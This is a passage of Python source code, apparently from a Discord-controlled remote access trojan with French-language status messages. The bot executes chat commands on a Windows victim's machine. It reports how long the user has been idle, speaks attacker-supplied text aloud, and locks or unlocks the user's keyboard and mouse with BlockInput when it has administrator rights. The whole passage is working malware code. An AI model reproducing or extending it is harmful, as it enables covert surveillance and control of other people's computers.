                    ('dwTime', c_int),
                ]

            def get_idle_duration():
                lastInputInfo = LASTINPUTINFO()
                lastInputInfo.cbSize = sizeof(lastInputInfo)
                if windll.user32.GetLastInputInfo(byref(lastInputInfo)):
                    millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
                    return millis / 1000.0
                else:
                    return 0
            import threading
            global idle1
            idle1 = threading.Thread(target=get_idle_duration)
            idle1._running = True
            idle1.daemon = True
            idle1.start()
            duration = get_idle_duration()
            await message.channel.send('Oisiveté de l''utilisateur pour %.2f seconds.' % duration)
            import time
            time.sleep(1)

        if message.content.startswith("!voice"):
            volumeup()
            import comtypes
            import win32com.client as wincl
            speak = wincl.Dispatch("SAPI.SpVoice")
            speak.Speak(message.content[7:])
            comtypes.CoUninitialize()
            await  message.channel.send("[*] Commande exécutée avec succès")

        if message.content.startswith("!blockinput"):
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                ok = windll.user32.BlockInput(True)
                await message.channel.send("[*] Commande exécutée avec succès")
            else:
                await message.channel.send("[!] Des droits d'administrateur sont nécessaires pour cette opération")

        if message.content.startswith("!unblockinput"):
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                ok = windll.user32.BlockInput(False)
                await  message.channel.send("[*] Commande exécutée avec succès")
            else:
                await message.channel.send("[!] Des droits d'administrateur sont nécessaires pour cette opération")

client.run(token)
